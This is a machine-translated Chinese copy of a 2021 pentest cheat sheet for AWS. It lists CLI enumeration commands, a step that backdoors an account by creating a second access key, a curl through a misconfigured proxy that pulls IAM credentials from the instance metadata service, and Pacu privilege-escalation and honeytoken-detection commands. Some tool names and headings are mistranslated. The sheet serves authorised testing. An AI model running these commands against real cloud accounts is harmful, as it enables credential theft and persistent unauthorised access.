<html>
<head>
<title>Useful Pentest Notes: Cloud Edition</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">有用的Pentest笔记:云版</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/useful-pentest-notes-cloud-edition-8c44382fc1a8?source=collection_archive---------5-----------------------#2021-09-16">https://infosecwriteups.com/useful-pentest-notes-cloud-edition-8c44382fc1a8?source=collection_archive---------5-----------------------#2021-09-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="8b4e" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">AWS备忘单</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/aaf0c693c5122a89a72cf6591f1bae28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*4fBe64Z21ESO2yTe"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">unsplash.com</figcaption></figure><h1 id="64d5" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">证明</h1><p id="1774" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">为身份验证设置AWS编程密钥(对于新的配置文件，使用— profile=)</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="62a7" class="mo kw iq mk b gy mp mq l mr ms">aws configure</span></pre><h2 id="64bc" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">开放S3桶枚举</h2><p id="ed00" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">列出一个S3桶的内容</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="8a4e" class="mo kw iq mk b gy mp mq l mr ms">aws s3 ls s3://&lt;bucketname&gt;/</span></pre><p id="4c74" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">下载存储桶的内容</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="ca60" class="mo kw iq mk b gy mp mq l mr ms">aws s3 sync s3://bucketname s3-files-dir</span></pre><h2 id="887b" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">账户信息</h2><p id="6407" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">获取基本帐户信息</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="5c33" class="mo kw iq mk b gy mp mq l mr ms">aws sts get-caller-identity</span></pre><p id="ff1d" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">列出IAM用户</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="caae" class="mo kw iq mk b gy mp mq l mr ms">aws iam list-users</span></pre><p id="e95c" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">列出IAM角色</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="7d2b" class="mo kw iq mk b gy mp mq l mr ms">aws iam list-roles</span></pre><p id="9a1e" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">列出帐户可访问的S3时段</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="bc6f" class="mo kw iq mk b gy mp mq l mr ms">aws s3 ls</span></pre><h2 id="a6a2" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">虚拟机</h2><p id="6572" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">列出EC2实例</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="6132" class="mo kw iq mk b gy mp mq l mr ms">aws ec2 describe-instances</span></pre><h2 id="ca4c" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">web应用程序和SQL</h2><p id="2e17" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">列出web应用程序</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="9e13" class="mo kw iq mk b gy mp mq l mr ms">aws deploy list-applications</span></pre><p id="6bb6" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">列出AWS RDS (SQL)</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="3778" class="mo kw iq mk b gy mp mq l mr ms">aws rds describe-db-instances --region &lt;region name&gt;</span></pre><p id="2618" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">知道了VPC安全组ID，您可以查询防火墙规则来确定连接潜力</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="6471" class="mo kw iq mk b gy mp mq l mr ms">aws ec2 describe-security-groups --group-ids &lt;VPC Security Group ID&gt; --region &lt;region&gt;</span></pre><h2 id="12c5" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">无服务器</h2><p id="4bec" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">列出Lambda函数</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="631d" class="mo kw iq mk b gy mp mq l mr ms">aws lambda list-functions --region &lt;region&gt;</span></pre><p id="5ff6" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">查看为机密设置的环境变量并分析代码</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="2606" class="mo kw iq mk b gy mp mq l mr ms">aws lambda get-function --function-name &lt;lambda function&gt;</span></pre><h2 id="9155" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">建立工作关系网</h2><p id="0d38" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">列出EC2子网</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="0c51" class="mo kw iq mk b gy mp mq l mr ms">aws ec2 describe-subnets</span></pre><p id="0089" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">列出ec2网络接口</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="4231" class="mo kw iq mk b gy mp mq l mr ms">aws ec2 describe-network-interfaces</span></pre><p id="8e9e" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">列出直接连接(VPN)连接</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="a3e8" class="mo kw iq mk b gy mp mq l mr ms">aws directconnect describe-connections</span></pre><h2 id="1192" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">后门</h2><p id="2d90" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">列出用户的访问键</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="9cac" class="mo kw iq mk b gy mp mq l mr ms">aws iam list-access-keys --user-name &lt;username&gt;</span></pre><p id="0211" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">具有第二组访问密钥的后门帐户</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="2623" class="mo kw iq mk b gy mp mq l mr ms">aws iam create-access-key --user-name &lt;username&gt;</span></pre><h1 id="d0f2" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">实例元数据服务URL</h1><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="c4d3" class="mo kw iq mk b gy mp mq l mr ms"><a class="ae nj" href="http://169.254.169.254/latest/meta-data" rel="noopener ugc nofollow" target="_blank">http://169.254.169.254/latest/meta-data</a></span></pre><p id="4d29" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">此处可能提供额外的IAM证书</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="9cf4" class="mo kw iq mk b gy mp mq l mr ms">http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;IAM Role Name&gt;</span></pre><p id="927c" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">如果代理服务(如Nginx)被托管在AWS中并且配置错误，可能会受到外部攻击</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="4e47" class="mo kw iq mk b gy mp mq l mr ms">curl --proxy vulndomain.target.com:80 <a class="ae nj" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" rel="noopener ugc nofollow" target="_blank">http://169.254.169.254/latest/meta-data/iam/security-credentials/</a> &amp;&amp; echo</span></pre><p id="75fd" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">IMDS版本2有一些保护，但这些命令可以用来访问它</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="140d" class="mo kw iq mk b gy mp mq l mr ms">TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` <br/>curl <a class="ae nj" href="http://169.254.169.254/latest/meta-data/profile" rel="noopener ugc nofollow" target="_blank">http://169.254.169.254/latest/meta-data/profile</a> -H "X-aws-ec2-metadata-token: $TOKEN"</span></pre><h1 id="89da" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">其他AWS工具</h1><h2 id="fccc" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">古怪的</h2><p id="2683" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><a class="ae nj" href="https://github.com/carnal0wnage/weirdAAL" rel="noopener ugc nofollow" target="_blank">https://github.com/carnal0wnage/weirdAAL</a></p><p id="0f13" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">对所有AWS服务运行recon，以枚举一组密钥的访问权限</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="c260" class="mo kw iq mk b gy mp mq l mr ms">python3 weirdAAL.py -m recon_all -t &lt;name&gt;</span></pre><h2 id="6fab" class="mo kw iq bd kx mt mu dn lb mv mw dp lf lw mx my lh ma mz na lj me nb nc ll nd bi translated">帕库</h2><p id="6f3a" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">AWS开发框架</p><p id="bf41" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">https://github.com/RhinoSecurityLabs/pacu<a class="ae nj" href="https://github.com/RhinoSecurityLabs/pacu" rel="noopener ugc nofollow" target="_blank"/></p><p id="7b8a" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">安装Pacu</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="1282" class="mo kw iq mk b gy mp mq l mr ms">sudo apt-get install python3-pip<br/>git clone <a class="ae nj" href="https://github.com/RhinoSecurityLabs/pacu" rel="noopener ugc nofollow" target="_blank">https://github.com/RhinoSecurityLabs/pacu</a><br/>cd pacu<br/>sudo bash install.sh</span></pre><p id="6588" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">导入特定配置文件的AWS密钥</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="82bc" class="mo kw iq mk b gy mp mq l mr ms">import_keys &lt;profile name&gt;</span></pre><p id="4c3d" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">检测密钥是否为蜜罐令牌密钥</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="acfc" class="mo kw iq mk b gy mp mq l mr ms">run iam__detect_honeytokens</span></pre><p id="6bb2" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">枚举帐户信息和权限</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="f801" class="mo kw iq mk b gy mp mq l mr ms">run iam__enum_users_roles_policies_groups<br/>run iam__enum_permissions<br/>whoami</span></pre><p id="44ce" class="pw-post-body-paragraph ln lo iq lp b lq ne jr ls lt nf ju lv lw ng ly lz ma nh mc md me ni mg mh mi ij bi translated">检查权限提升</p><pre class="kg kh ki kj gt mj mk ml mm aw mn bi"><span id="a0c8" class="mo kw iq mk b gy mp mq l mr ms">run iam__privesc_scan</span></pre></div></div>    
</body>
</html>